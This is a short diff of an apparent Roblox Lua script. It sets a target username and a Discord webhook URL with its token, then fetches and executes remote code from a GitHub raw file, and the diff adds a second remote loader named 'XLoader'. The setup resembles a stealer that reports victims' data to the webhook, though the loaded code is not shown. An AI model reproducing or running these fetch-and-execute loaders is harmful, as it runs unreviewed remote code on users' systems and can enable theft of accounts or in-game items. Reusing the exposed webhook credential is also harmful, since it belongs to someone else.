@@ -1,4 +1,8 @@
 Username = "CryNoMorePet"
 Webhook = "https://discord.com/api/webhooks/1274667562902229053/UsJ63uP1dY5HS3fVyyoRafBSy1XoBs8MecjTeYQkSh_DXvGFl71qHxNg9gip4MlU8Rz6"
 
+getgenv().gui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua"))()
+
+_G.scriptName = "XLoader"
+loadstring(game:HttpGet("https://gist.githubusercontent.com/XScriptsOfficial/c166440c2c5c9d5ef2e1f25248ebaf8a/raw/e2329c9d42fc495525b23e63146519d1a5f3f0d5/XLoader"))()
